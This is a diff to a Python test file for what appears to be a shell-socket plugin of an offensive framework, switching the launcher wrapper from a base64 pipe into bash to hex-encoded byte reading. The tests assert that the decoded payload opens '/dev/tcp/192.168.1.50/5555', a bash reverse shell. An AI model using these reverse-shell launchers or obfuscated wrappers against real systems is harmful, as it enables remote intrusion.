@@ -1,4 +1,3 @@
-import base64
 from pathlib import Path
 
 import declusor_shell_socket as shell_socket
@@ -60,11 +59,12 @@ class TestShellSocketPluginRuntime:
         delivery = runtime.launcher
         assert isinstance(delivery, contract.LauncherDelivery)
         assert delivery.wrapper_template == shell_socket.ShellSocketRuntime.DEFAULT_WRAPPER_TEMPLATE
-        assert "(echo '" in delivery.wrapped_text
-        assert "|base64 -d|bash)" in delivery.wrapped_text
+        assert "bash -c '" in delivery.wrapped_text
+        assert "while IFS= read -r -n2 byte" in delivery.wrapped_text
+        assert "|base64 -d|" not in delivery.wrapped_text
         assert delivery.text in delivery.wrapped_text
 
-        decoded = base64.b64decode(delivery.script).decode("utf-8")
+        decoded = bytes.fromhex(delivery.text).decode("utf-8")
         assert "/dev/tcp/192.168.1.50/5555" in decoded
         assert "$DECLUSOR_HOST" not in decoded
         assert "$DECLUSOR_PORT" not in decoded
